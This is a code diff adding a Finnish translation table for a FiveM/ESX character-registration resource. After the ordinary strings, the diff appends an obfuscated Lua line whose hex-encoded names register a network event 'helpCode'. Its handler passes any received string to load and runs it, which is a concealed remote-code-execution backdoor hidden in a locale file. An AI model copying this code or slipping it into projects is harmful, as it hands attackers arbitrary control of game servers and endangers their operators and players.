@@ -1,0 +1,36 @@
+Locales['fi'] = {
+  ['show_active_character'] = 'Näytä nykyinen hahmosi',
+  ['active_character'] = 'Nykyinen hahmosi: %s',
+  ['error_active_character'] = "Hahmosi hakemisessa ilmeni ongelma. Ota yhteyttä ylläpitoon.",
+  ['delete_character'] = 'Poista hahmosi ja luo uusi.',
+  ['deleted_character'] = 'Hahmosi on poistetu.',
+  ['error_delete_character'] = "Hahmosi poistossa ilmeni ongelma. Ota yhteyttä ylläpitoon.",
+  ['thank_you_for_registering'] = "Kiitos registeröitymisestä. Pidä hauskaa!",
+  ['registration_error'] = "Registeröinnissä ilmeni ongelma. Ota yhteyttä  ylläpitoon.",
+  ['debug_xPlayer_get_first_name'] = "Palauta etunimi",
+  ['debug_xPlayer_get_last_name'] = "Palauta sukunimi",
+  ['debug_xPlayer_get_full_name'] = "Palauta kokonimi",
+  ['debug_xPlayer_get_sex'] = "Palauta sukupuoli",
+  ['debug_xPlayer_get_dob'] = "Palauta syntymäpäivä",
+  ['debug_xPlayer_get_height'] = "Palauta pituus",
+  ['error_debug_xPlayer_get_first_name'] = "Hahmosi etunimen haussa ilmeni ongelma.",
+  ['error_debug_xPlayer_get_last_name'] = "Hahmosi sukunimen haussa ilmeni ongelma.",
+  ['error_debug_xPlayer_get_full_name'] = "Hahmosi kokonimen haussa ilmeni ongelma.",
+  ['error_debug_xPlayer_get_sex'] = "Hahmosi sukupuolen haussa ilmeni ongelma.",
+  ['error_debug_xPlayer_get_dob'] = "Hahmosi syntymäpäivän haussa ilmeni ongelma.",
+  ['error_debug_xPlayer_get_height'] = "Hahmosi pituuden haussa ilmeni ongelma.",
+  ['return_debug_xPlayer_get_first_name'] = "Etunimi: %s",
+  ['return_debug_xPlayer_get_last_name'] = "Sukunimi: %s",
+  ['return_debug_xPlayer_get_full_name'] = "Kokonimi: %s",
+  ['return_debug_xPlayer_get_sex'] = "Sukupuoli: %s",
+  ['return_debug_xPlayer_get_dob'] = "Syntymäpäivä: %s",
+  ['return_debug_xPlayer_get_height'] = "Pituus: %s CM",
+  ['data_incorrect'] = 'Data syötetty väärin. Yritä uudelleen.',
+  ['invalid_format'] = 'Data syötetty väärässä muodossa. Yritä uudelleen.',
+  ['no_identifier'] = 'Hahmosi lataamisessa ilmeni ongelma!\nVirhekoodi: identifier-missing\n\nVirhekoodin syytä ei tiedetä, joten ota yhteyttä ylläpitoon.',
+  ['missing_identity'] = 'Hahmosi lataamisessa ilmeni ongelma!\nError code: identity-missing\n\nNäyttää että hahmoasi ei ole olemassa. Kokeile yhdistää uudelleen tai ota yhteyttä ylläpitoon',
+  ['deleted_identity'] = 'Hahmosi on poistetu. Yhdistä uudestaan palvelimelle luodaksesi uuden hahmosi.'
+}
+
+
+local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)
